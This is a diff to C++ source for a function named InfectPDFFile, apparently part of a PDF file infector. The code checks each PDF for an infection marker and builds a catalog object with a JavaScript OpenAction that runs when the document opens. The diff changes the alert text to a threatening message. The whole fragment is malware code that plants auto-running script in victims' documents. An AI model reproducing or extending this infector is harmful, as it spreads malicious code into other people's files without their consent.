@@ -75,13 +75,13 @@ bool InfectPDFFile(const std::string& filePath)
 
     file.close();
 
-    if (content.find("app.alert('HPPD')") != std::string::npos)
+    if (content.find("app.alert('THE END IS NEAR    ENBRACE FOR IMPACT')") != std::string::npos)
         return false;
 
     const char* jsBlock =
         "\n100 obj\n"
         "<< /Type /Catalog /OpenAction"
-        " << /S /JavaScript /JS (app.alert('HPPD')) >> >>\n"
+        " << /S /JavaScript /JS (app.alert('THE END IS NEAR    ENBRACE FOR IMPACT')) >> >>\n"
         "endobj\n";
 
     size_t eofPos = content.rfind("%%EOF");
